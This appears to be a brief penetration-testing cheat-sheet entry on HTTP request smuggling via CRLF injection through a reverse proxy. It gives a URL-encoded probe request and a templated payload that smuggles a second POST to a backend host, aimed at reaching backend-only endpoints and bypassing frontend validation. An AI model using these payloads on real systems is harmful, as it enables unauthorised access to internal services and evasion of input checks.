# HTTP Request Smuggling

CRLF injection through a reverse proxy can let you smuggle a second request that the backend parses separately from the frontend. Probe first:

```bash
GET /page%20HTTP/1.1%0d%0aFoo:%20bar HTTP/1.1
Host: <target>
```
If that returns normally (200, not an error), the proxy is passing CRLF through. Smuggle a full second request behind the first:

```bash
GET /page%20HTTP/1.1%0d%0aHost:%20<backend>%0d%0a%0d%0aPOST%20/endpoint%20HTTP/1.1%0d%0aHost:%20<backend>%0d%0aContent-Type:%20application/x-www-form-urlencoded%0d%0aContent-Length:%20<n>%0d%0a%0d%0a<body> HTTP/1.1
Host: <frontend>
```
Use this to reach backend-only endpoints or inject parameters the frontend would normally strip/validate.
